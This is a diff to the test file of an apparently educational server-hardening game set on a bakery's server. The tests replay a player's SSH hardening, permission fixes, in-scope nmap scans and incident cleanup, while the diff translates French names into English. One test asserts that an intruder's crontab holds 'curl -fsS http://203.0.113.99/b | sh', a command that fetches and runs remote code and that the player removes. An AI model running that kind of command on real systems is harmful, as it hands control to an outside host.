@@ -1,4 +1,4 @@
-// The Audit: Le Fournil's server (the scope, the report, the exposure, the
+// The Audit: the Bakery's server (the scope, the report, the exposure, the
 // traces, the follow-up visit).
 // Replayed with the console, in each language.
 
@@ -7,6 +7,7 @@ import { Console } from '../src/engine/console';
 import { STORIES } from '../src/engine/chapters';
 import { prerequisites } from '../src/engine/unlocking';
 import { LANGUAGES, translator } from '../src/texts';
+import { password } from '../src/engine/world';
 import { inLanguage, machinesInLanguage } from './names';
 
 // The Eraser, then the chapters to finish to receive the story's key.
@@ -53,15 +54,15 @@ for (const language of LANGUAGES)
 
     it('chapter 2 — solution: root closed, Lucas deleted, sudo with a password, secret at 600', () => {
       const { c, jouer: play, editer: edit } = part(['scope']);
-      let all = play(['cat audit_report.txt', 'sudo -l', 'ls -l /srv/commandes']);
+      let all = play(['cat audit_report.txt', 'sudo -l', 'ls -l /srv/orders']);
       contains(all, 'RAPPORT D\'AUDIT');
       expect(all).toContain('NOPASSWD');
       // At the start, no finding is dealt with.
-      for (const id of ['ssh', 'compte', 'sudo', 'secret']) expect(c.shell.flags.has(id), id).toBe(false);
+      for (const id of ['ssh', 'account', 'sudo', 'secret']) expect(c.shell.flags.has(id), id).toBe(false);
       edit('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
       play(['sudo sshd -t', 'sudo systemctl reload ssh']);
       expect(c.finished).not.toContain('report');
-      play(['sudo userdel lucas', 'sudo rm /etc/sudoers.d/90-cloud-init-users', 'sudo chmod 600 /srv/commandes/.env']);
+      play(['sudo userdel lucas', 'sudo rm /etc/sudoers.d/90-cloud-init-users', 'sudo chmod 600 /srv/orders/.env']);
       all = play(['sudo -l']);
       expect(all).not.toContain('NOPASSWD');
       expect(c.finished).toContain('report');
@@ -72,7 +73,7 @@ for (const language of LANGUAGES)
       edit('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
       play(['sudo systemctl reload ssh', 'sudo usermod -L -e 1 lucas', 'sudo gpasswd -d lucas sudo']);
       edit('sudo nano /etc/sudoers.d/90-cloud-init-users', () => 'you ALL=(ALL) ALL');
-      play(['sudo chmod 640 /srv/commandes/.env']);
+      play(['sudo chmod 640 /srv/orders/.env']);
       expect(c.finished).toContain('report');
     });
 
@@ -83,7 +84,7 @@ for (const language of LANGUAGES)
       expect(e('without-effect')).toBe(true);
       play(['sudo usermod -L lucas']);
       expect(e('account-incomplete')).toBe(true);
-      play(['sudo chown root:root /srv/commandes/.env', 'sudo chmod 600 /srv/commandes/.env']);
+      play(['sudo chown root:root /srv/orders/.env', 'sudo chmod 600 /srv/orders/.env']);
       expect(e('app-blind')).toBe(true);
       expect(c.finished).not.toContain('report');
     });
@@ -144,9 +145,11 @@ for (const language of LANGUAGES)
 
     
     const KEYS = '/home/nadia/.ssh/authorized_keys';
-    const ENV = '/srv/commandes/.env';
-    const NEW = 'baguette-tradition-2028-champagne';
-    const withoutIntruder = (t: string) => t.split('\n').filter((l) => !l.includes('nadia@portable')).join('\n');
+    const ENV = '/srv/orders/.env';
+    const NEW = 'tradition-loaf-2028-harvest';
+    // The database password the intruder read, in the language (brioche-beurre-91 in French).
+    const OLD = password(translator(language), 'butter-brioche-91');
+    const withoutIntruder = (t: string) => t.split('\n').filter((l) => !l.includes(L('nadia@laptop'))).join('\n');
     const withoutTag = (t: string) => t.split('\n').filter((l) => !l.includes('203.0.113.99')).join('\n');
 
     it('chapter 4 — solution: journal, last, fingerprint, key removed, crontab cleaned', () => {
@@ -155,24 +158,24 @@ for (const language of LANGUAGES)
       expect(all).toContain('203.0.113.99');
       expect(all).toContain('Accepted publickey for nadia from 203.0.113.99 port 52144 ssh2: ED25519 SHA256:');
       all = play([`sudo ssh-keygen -l -f ${KEYS}`]);
-      expect(all).toContain('nadia@boutique (ED25519)');
-      expect(all).toContain('nadia@portable (ED25519)');
+      expect(all).toContain(`${L('nadia@shop')} (ED25519)`);
+      expect(all).toContain(`${L('nadia@laptop')} (ED25519)`);
       edit(`sudo nano ${KEYS}`, withoutIntruder);
       expect(c.finished).not.toContain('traces');
       all = play(['sudo crontab -u nadia -l']);
       expect(all).toContain('curl -fsS http://203.0.113.99/b | sh');
       edit('sudo crontab -u nadia -e', withoutTag);
       all = play(['sudo crontab -u nadia -l']);
-      expect(all).toContain('sauvegarde.sh');
+      expect(all).toContain(L('backup.sh'));
       expect(all).not.toContain('203.0.113.99');
       // The intruder read the secret: the password is changed on both sides, then the app is restarted.
       expect(c.finished).not.toContain('traces');
-      expect(play(['sudo cat /home/nadia/.bash_history'])).toContain('cat /srv/commandes/.env');
-      expect(play([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NEW}'"`])).toContain('ALTER ROLE');
-      edit(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NEW));
+      expect(play(['sudo cat /home/nadia/.bash_history'])).toContain(L('cat /srv/orders/.env'));
+      expect(play([`sudo -u postgres psql -c "ALTER ROLE orders PASSWORD '${NEW}'"`])).toContain('ALTER ROLE');
+      edit(`sudo nano ${ENV}`, (t) => t.replace(OLD, NEW));
       expect(c.finished).not.toContain('traces');
-      play(['sudo systemctl restart commandes']);
-      expect(play(['systemctl is-active commandes'])).toContain('active');
+      play(['sudo systemctl restart orders']);
+      expect(play(['systemctl is-active orders'])).toContain('active');
       expect(c.finished).toContain('traces');
     });
 
@@ -181,23 +184,23 @@ for (const language of LANGUAGES)
       const e = (id: string) => c.shell.flags.has(id);
       edit(`sudo nano ${KEYS}`, withoutIntruder);
       edit('sudo crontab -u nadia -e', withoutTag);
-      expect(play(['psql -c "ALTER ROLE commandes PASSWORD \'x\'"'])).toContain('does not exist');
-      play([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD 'court'"`]);
+      expect(play(['psql -c "ALTER ROLE orders PASSWORD \'x\'"'])).toContain('does not exist');
+      play([`sudo -u postgres psql -c "ALTER ROLE orders PASSWORD 'short'"`]);
       expect(e('password-weak')).toBe(true);
       // One side only: the database changed, not .env — the app no longer starts.
-      play([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NEW}'"`, 'sudo systemctl restart commandes']);
+      play([`sudo -u postgres psql -c "ALTER ROLE orders PASSWORD '${NEW}'"`, 'sudo systemctl restart orders']);
       expect(e('app-down')).toBe(true);
-      expect(play(['sudo journalctl -u commandes -n 5'])).toContain('password authentication failed');
+      expect(play(['sudo journalctl -u orders -n 5'])).toContain('password authentication failed');
       // Both sides agree, but not restarted: it keeps the old password in memory.
-      edit(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NEW));
-      play(['sudo systemctl restart commandes']);
+      edit(`sudo nano ${ENV}`, (t) => t.replace(OLD, NEW));
+      play(['sudo systemctl restart orders']);
       expect(c.finished).toContain('traces');
       // The same case without a restart: "to be restarted".
       const b = part(['scope', 'report', 'exposure']);
       b.editer(`sudo nano ${KEYS}`, withoutIntruder);
       b.editer('sudo crontab -u nadia -e', withoutTag);
-      b.jouer([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NEW}'"`]);
-      b.editer(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NEW));
+      b.jouer([`sudo -u postgres psql -c "ALTER ROLE orders PASSWORD '${NEW}'"`]);
+      b.editer(`sudo nano ${ENV}`, (t) => t.replace(OLD, NEW));
       expect(b.c.shell.flags.has('a-restart')).toBe(true);
       expect(b.c.finished).not.toContain('traces');
     });
@@ -216,7 +219,7 @@ for (const language of LANGUAGES)
     // ——— Chapter 1, "The Scope" ———
     const NOTES = (outside: string) => `# ${fr ? 'Notes' : 'Notes'}
 ## ${fr ? 'Périmètre' : 'Scope'}
-${fr ? 'Seulement le serveur fournil (192.0.2.22), comme la lettre de mission.' : 'Only the fournil server (192.0.2.22), as in the letter of engagement.'}
+${fr ? 'Seulement le serveur fournil (192.0.2.22), comme la lettre de mission.' : 'Only the bakery server (192.0.2.22), as in the letter of engagement.'}
 ## ${fr ? "Ce que j'ai trouvé" : 'What I found'}
 ${fr ? 'Vus d’internet : SSH (22), le site (80, 443), mais aussi PostgreSQL (5432) et Redis (6379).' : 'Seen from the internet: SSH (22), the website (80, 443), but also PostgreSQL (5432) and Redis (6379).'}
 ## ${fr ? 'Hors périmètre' : 'Out of scope'}
@@ -248,7 +251,7 @@ ${outside}`;
     it('chapter 1 — false lead: scanning the whole network probes the neighbour (the mistake, told in the debrief)', () => {
       const { c, jouer: play, editer: edit } = part();
       const all = play(['nmap -sV -oN inventory.txt 192.0.2.16/28']);
-      expect(all).toContain('Nmap scan report for voisin.internal (192.0.2.24)');
+      expect(all).toContain(L('Nmap scan report for neighbour.internal (192.0.2.24)'));
       expect(all).toContain('3306/tcp open  mysql   MariaDB 10.11.6');
       expect(all).toContain('Nmap done: 16 IP addresses (2 hosts up) scanned in');
       expect(c.shell.flags.has('outside-scope')).toBe(true);
@@ -275,7 +278,7 @@ ${outside}`;
       const muted = play(['nmap 192.0.2.99']);
       expect(muted).toContain('Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn');
       expect(muted).toContain('Nmap done: 1 IP address (0 hosts up) scanned in');
-      expect(play(['nmap inconnue.internal'])).toContain('Failed to resolve "inconnue.internal".');
+      expect(play(['nmap unknown.internal'])).toContain('Failed to resolve "unknown.internal".');
       expect(play(['nmap -sn bakery.internal'])).toContain('Host is up (0.011s latency).');
       const ports = play(['nmap -p 22,3306 bakery.internal']);
       expect(ports).toContain('22/tcp   open   ssh');
